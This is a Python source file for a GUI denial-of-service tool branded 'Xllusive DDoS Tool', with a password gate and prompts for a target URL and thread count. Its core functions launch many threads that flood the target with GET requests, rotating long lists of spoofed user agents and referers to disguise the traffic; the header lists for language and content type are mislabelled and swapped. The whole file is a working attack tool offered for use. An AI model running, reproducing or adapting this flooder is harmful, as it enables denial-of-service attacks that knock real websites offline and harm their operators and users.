import requests
import threading
import colorama
import random
import time
import os
from tkinter import Tk, Label, StringVar, Button, Canvas, Frame, Entry
from tkinter import PhotoImage, Toplevel
from tkinter.messagebox import showinfo
from playsound import playsound
from PIL import Image, ImageTk
import pygame
import sys
from time import sleep
from pystyle import *
import subprocess
import multiprocess
import aiohttp
import asyncio


#//Gui Start//#

headers = {
  "User-Agent": "Xllusive DDoS"
}

osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
██╗██╗     ██╗     ██╗   ██╗███████╗██╗██╗   ██╗███████╗
██║██║     ██║     ██║   ██║██╔════╝██║██║   ██║██╔════╝
██║██║     ██║     ██║   ██║███████╗██║██║   ██║███████╗
██║██║     ██║     ██║   ██║╚════██║██║██║   ██║██     ║
██║███████╗███████╗╚██████╔╝███████║██║╚██████╔╝███████║
╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝ ╚══════╝    
             XLLUSIVE DDoS TOOL                            
            CREDITS = ILLUSIVEHACKS - CIPHER
            click "Start on the Xllusive Ddos Tool"  
'''

banner = r"""
v1 """.replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

print(Colorate.Horizontal(Colors.red_to_blue, banner))


# GUI Setup
class StressTestGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Xllusive Ddos Tool")
        self.root.geometry("700x500")
        self.root.resizable(False, False)

        # Load the background image
        self.background_image = PhotoImage(file="71316.png")  # Ensure the image file is available in the directory
        self.background_label = Label(self.root, image=self.background_image)
        self.background_label.place(relwidth=1, relheight=1)  # Make it cover the entire window

        self.status = StringVar()
        self.status.set("Welcome! Click Start to begin.")

        # Create a frame to hold the status label and canvas
        self.main_frame = Frame(self.root, bg="black")
        self.main_frame.pack(fill="both", expand=True)

        # Status label above the canvas
        self.status_label = Label(self.main_frame, textvariable=self.status, font=("Helvetica", 12), wraplength=550, fg="white", bg="black")
        self.status_label.pack(pady=20)

        # Create a canvas for the background (scrolling code)
        self.canvas = Canvas(self.main_frame, width=600, height=200, bd=0, highlightthickness=0, bg='black')  # Set background to black
        self.canvas.pack(fill="both", expand=True)

        # Add random code text to simulate a moving background
        self.code_lines = ["Initializing hacking sequence...", "Bypassing security protocols...", "Connecting to remote server...", "Running exploit..."]
        self.code_texts = []
        self.create_code_lines()

        # Load and resize the GIF image to reduce its size
        self.gif_image = Image.open("hack-hacker.gif")
        self.gif_image = self.gif_image.resize((200, 200), Image.Resampling.LANCZOS)  # Resize the GIF to fit better
        self.gif_image = ImageTk.PhotoImage(self.gif_image)  # Convert to Tkinter compatible format
        self.gif_label = Label(self.main_frame, image=self.gif_image, bg="black")
        
        # Fix the GIF to the right side
        self.gif_label.place(x=470, y=100)  # Adjust 'x' and 'y' to position the GIF where you want

        # Start the scrolling of the code
        self.scroll_code()

        # Event to stop the test
        self.stop_event = threading.Event()

        # Create buttons frame at the bottom
        self.button_frame = Frame(self.root, bg="black")
        self.button_frame.pack(fill="x", side="bottom", pady=10)

        # Create start and stop buttons inside the frame
        self.start_button = Button(self.button_frame, text="Start Attack", command=self.start_test, bg="green", fg="white", font=("Helvetica", 12), relief="raised", bd=3)
        self.start_button.pack(side="left", padx=10, pady=10)

        self.stop_button = Button(self.button_frame, text="Stop Attack", command=self.stop_test, bg="red", fg="white", font=("Helvetica", 12), relief="raised", bd=3)
        self.stop_button.pack(side="right", padx=10, pady=10)
        
        # User inputs for target URL and threads
        self.url = None
        self.num_threads = None

    def create_code_lines(self):
        # Create the initial set of code lines that will scroll
        y_position = 20
        for line in self.code_lines:
            text = self.canvas.create_text(10, y_position, anchor="nw", text=line, fill="lime", font=("Courier", 12))
            self.code_texts.append(text)
            y_position += 20

    def start_test(self):
        self.get_user_input()
        
        
    def get_user_input(self):
        # Input prompt for URL and threads
        input_prompt = Toplevel(self.root)
        input_prompt.title("Target Configuration")
        input_prompt.geometry("400x200")

        Label(input_prompt, text="Enter Target URL:", font=("Helvetica", 12)).pack(pady=10)
        url_entry = Entry(input_prompt, font=("Helvetica", 12))
        url_entry.pack()

        Label(input_prompt, text="Enter Number of Threads:", font=("Helvetica", 12)).pack(pady=10)
        thread_entry = Entry(input_prompt, font=("Helvetica", 12))
        thread_entry.pack()

        def set_values():
            self.url = url_entry.get()
            if not self.url.startswith("http"):
                self.url = "http://" + self.url
            self.num_threads = int(thread_entry.get())
            input_prompt.destroy()
            self.authenticate_user()

        Button(input_prompt, text="Confirm", command=set_values, bg="blue", fg="white").pack(pady=10)


    def authenticate_user(self):
        # Password prompt for authentication
        password_prompt = Toplevel(self.root)
        password_prompt.title("Authentication")
        password_prompt.geometry("300x150")

        password_label = Label(password_prompt, text="Enter Password:", font=("Helvetica", 12))
        password_label.pack(pady=20)

        password_entry = Entry(password_prompt, show="*", font=("Helvetica", 12))
        password_entry.pack()

        def verify_password():
            if password_entry.get() == "illusivehacks1":
                password_prompt.destroy()
                self.status.set("Starting Ddos Attack... Please wait.")
                self.play_hacking_sound()
                self.stop_event.clear()
                # Pass both URL and num_threads here
                threading.Thread(target=main, args=(self.update_status, self.stop_event, self.url, self.num_threads), daemon=True).start()
            else:
                showinfo("Error", "Incorrect password. Try again.")

        password_button = Button(password_prompt, text="Authenticate", command=verify_password, bg="green", fg="white")
        password_button.pack(pady=10)

    def play_hacking_sound(self):
        # Initialize pygame mixer
        pygame.mixer.init()
        pygame.mixer.music.load("recording.wav")  # Ensure the sound file exists in the directory
        pygame.mixer.music.play()

    def stop_test(self):
        self.status.set("Attack Stopped.")
        self.stop_event.set()  # Set the stop event to stop the test

    def update_status(self, message):
        self.status.set(message)

    def scroll_code(self):
        # Move the code text upwards
        for text in self.code_texts:
            self.canvas.move(text, 0, -2)

        # Loop the code: move the top line to the bottom after reaching the top
        if self.canvas.bbox(self.code_texts[0])[1] < 0:  # If the top text is off-screen
            self.canvas.move(self.code_texts[0], 0, len(self.code_lines) * 20)  # Move it to the bottom
            self.code_texts.append(self.code_texts.pop(0))  # Move the text to the end of the list

        self.canvas.after(100, self.scroll_code)  # Keep scrolling



# List of user agents for request headers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 8 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 13729.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.215 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; Android 8.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36 Edg/91.0.864.41",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
    "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.277",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Linux; Android 9; SM-G950U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 11; en-us; OnePlus 8T Build/RKQ1.201217.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nokia 7.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.92 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Mobile Safari/537.36",
]

# List of referers
referers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.pinterest.com/",
    "https://www.quora.com/",
    "https://www.tumblr.com/",
    "https://www.youtube.com/",
    "https://www.wikipedia.org/",
    "https://www.amazon.com/",
    "https://www.netflix.com/",
    "https://www.github.com/",
    "https://www.stackoverflow.com/",
    "https://www.medium.com/",
    "https://www.vimeo.com/",
    "https://www.twitch.tv/",
    "https://www.apple.com/",
    "https://www.microsoft.com/",
    "https://www.nike.com/",
    "https://www.adobe.com/",
    "https://www.spotify.com/",
    "https://www.reddit.com/r/funny/",
    "https://www.reddit.com/r/aww/",
    "https://www.reddit.com/r/technology/",
    "https://www.reddit.com/r/science/",
    "https://www.pokemon.com/",
    "https://www.walmart.com/",
    "https://www.target.com/",
    "https://www.aliexpress.com/",
    "https://www.ebay.com/",
    "https://www.bestbuy.com/",
    "https://www.hulu.com/",
    "https://www.cnn.com/",
    "https://www.bbc.com/",
    "https://www.nbc.com/",
    "https://www.reuters.com/",
    "https://www.forbes.com/",
    "https://www.wsj.com/",
    "https://www.theguardian.com/",
    "https://www.businessinsider.com/",
    "https://www.theverge.com/",
    "https://www.mashable.com/",
    "https://www.washingtonpost.com/",
    "https://www.npr.org/",
    "https://www.smh.com.au/",
    "https://www.theage.com.au/",
    "https://www.cbc.ca/",
    "https://www.sky.com/",
    "https://www.telegraph.co.uk/",
    "https://www.vox.com/",
    "https://www.smithsonianmag.com/",
    "https://www.nationalgeographic.com/",
    "https://www.merriam-webster.com/",
    "https://www.scribd.com/",
    "https://www.ted.com/",
    "https://www.stackexchange.com/",
    "https://www.wired.com/",
    "https://www.techcrunch.com/",
    "https://www.nytimes.com/",
    "https://www.bloomberg.com/",
    "https://www.cnbc.com/",
    "https://www.flickr.com/",
    "https://www.nationalreview.com/",
    "https://www.huffpost.com/",
    "https://www.digitaltrends.com/",
    "https://www.tomshardware.com/",
    "https://www.lessthanthree.com/",
    "https://www.polygon.com/",
    "https://www.kotaku.com/",
    "https://www.geek.com/",
    "https://www.engadget.com/",
    "https://www.cnet.com/",
    "https://www.zdnet.com/",
    "https://www.expertreviews.co.uk/",
    "https://www.techradar.com/",
    "https://www.pcworld.com/",
    "https://www.macworld.com/",
    "https://www.t3.com/",
    "https://www.gsmarena.com/",
    "https://www.androidcentral.com/",
    "https://www.digitalspy.com/",
    "https://www.androidauthority.com/",
    "https://www.appleinsider.com/",
    "https://www.cracked.com/",
    "https://www.mashable.com/",
    "https://www.digitaltrends.com/",
    "https://www.kickstarter.com/",
    "https://www.indiegogo.com/",
    "https://www.patreon.com/",
    "https://www.gofundme.com/",
    "https://www.craigslist.org/",
    "https://www.papermag.com/",
    "https://www.rollingstone.com/",
    "https://www.billboard.com/",
    "https://www.karousell.com/",
    "https://www.amazon.co.uk/",
    "https://www.alibaba.com/",
    "https://www.flipkart.com/",
    "https://www.snapdeal.com/",
    "https://www.myntra.com/",
    "https://www.lazada.com/",
    "https://www.jumia.com/",
    "https://www.shutterstock.com/",
    "https://www.gettyimages.com/",
    "https://www.istockphoto.com/",
    "https://www.pexels.com/",
    "https://www.unsplash.com/",
    "https://www.pixabay.com/",
    "https://www.stocksy.com/",
    "https://www.500px.com/",
    "https://www.photographyblog.com/",
    "https://www.dpreview.com/"
]

# List of accepted languages
accept_languages = [
    "application/json",
    "text/html",
    "application/xml",
    "multipart/form-data",
    "application/xhtml+xml",
    "application/javascript",
    "application/pdf",
    "application/zip",
    "application/msword",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "application/octet-stream",
    "image/png",
    "image/jpeg",
    "image/gif",
    "image/webp",
    "image/svg+xml",
    "image/bmp",
    "audio/mpeg",
    "audio/wav",
    "audio/ogg",
    "audio/mp4",
    "video/mp4",
    "video/webm",
    "video/ogg",
    "video/3gpp",
    "text/css",
    "text/plain",
    "text/javascript",
    "text/csv",
    "text/markdown",
    "application/x-www-form-urlencoded",
    "application/epub+zip",
    "application/atom+xml",
    "application/rss+xml",
    "application/x-shockwave-flash",
    "application/json-patch+json",
    "application/ld+json",
    "application/manifest+json",
    "application/vnd.api+json",
    "application/soap+xml",
    "application/vnd.oasis.opendocument.text",
    "application/vnd.oasis.opendocument.spreadsheet",
    "application/vnd.oasis.opendocument.presentation",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/vnd.ms-fontobject",
    "application/font-woff",
    "application/font-woff2",
    "application/font-ttf",
    "application/font-otf",
    "application/vnd.apple.installer+xml",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
]

# Content types
content_types = [
    "en-US,en;q=0.9",
    "es-ES,es;q=0.9",
    "de-DE,de;q=0.9",
    "fr-FR,fr;q=0.9",
    "ja-JP,ja;q=0.9",
    "ar-SA,ar;q=0.9",
    "bg-BG,bg;q=0.9",
    "bn-BD,bn;q=0.9",
    "ca-ES,ca;q=0.9",
    "cs-CZ,cs;q=0.9",
    "da-DK,da;q=0.9",
    "el-GR,el;q=0.9",
    "en-GB,en;q=0.9",
    "en-AU,en;q=0.9",
    "en-CA,en;q=0.9",
    "fi-FI,fi;q=0.9",
    "gl-ES,gl;q=0.9",
    "gu-IN,gu;q=0.9",
    "hi-IN,hi;q=0.9",
    "hr-HR,hr;q=0.9",
    "hu-HU,hu;q=0.9",
    "id-ID,id;q=0.9",
    "it-IT,it;q=0.9",
    "ka-GE,ka;q=0.9",
    "km-KH,km;q=0.9",
    "kn-IN,kn;q=0.9",
    "ko-KR,ko;q=0.9",
    "lt-LT,lt;q=0.9",
    "lv-LV,lv;q=0.9",
    "ml-IN,ml;q=0.9",
    "mr-IN,mr;q=0.9",
    "ms-MY,ms;q=0.9",
    "my-MM,my;q=0.9",
    "nb-NO,nb;q=0.9",
    "ne-NP,ne;q=0.9",
    "nl-NL,nl;q=0.9",
    "pl-PL,pl;q=0.9",
    "pt-PT,pt;q=0.9",
    "pt-BR,pt;q=0.9",
    "ro-RO,ro;q=0.9",
    "ru-RU,ru;q=0.9",
    "si-LK,si;q=0.9",
    "sk-SK,sk;q=0.9",
    "sl-SI,sl;q=0.9",
    "sr-RS,sr;q=0.9",
    "sv-SE,sv;q=0.9",
    "ta-IN,ta;q=0.9",
    "th-TH,th;q=0.9",
    "tr-TR,tr;q=0.9",
    "uk-UA,uk;q=0.9",
    "ur-PK,ur;q=0.9",
    "vi-VN,vi;q=0.9",
    "zh-CN,zh;q=0.9",
    "zh-TW,zh;q=0.9",
    "zu-ZA,zu;q=0.9",
]

# Function to send requests using random user agents, referers, and other headers
def send_request(update_status, stop_event, stats, target_url):
    success_count = 0
    failure_count = 0
    while not stop_event.is_set():  # Check if the stop event is set
        try:
            # Randomly select headers
            user_agent = random.choice(user_agents)
            referer = random.choice(referers)
            accept_language = random.choice(accept_languages)
            content_type = random.choice(content_types)

            headers = {
                "User-Agent": user_agent,
                "Referer": referer,
                "Accept-Language": accept_language,
                "Content-Type": content_type,
            }

            # Send request
            response = requests.get(target_url, headers=headers, timeout=5)
            stats["requests_sent"] += 1
            if response.status_code == 200:
                success_count += 1
            else:
                failure_count += 1
            update_status(f"Request Sent | Success: {success_count} | Failures: {failure_count}")
        except requests.exceptions.RequestException as e:
            stats["requests_sent"] += 1
            failure_count += 1
            update_status(f"Error: {e}")

# Main function remains the same
def main(update_status, stop_event, target_url, num_threads):
    stats = {
        "requests_sent": 0,
        "success_count": 0,
        "failure_count": 0,
    }

    # Start multiple threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(update_status, stop_event, stats, target_url), daemon=True)
        thread.start()
        threads.append(thread)

    # Keep the main thread alive while the attack runs
    for thread in threads:
        thread.join()

# Initialize GUI
if __name__ == "__main__":
    root = Tk()
    app = StressTestGUI(root)
    root.mainloop()
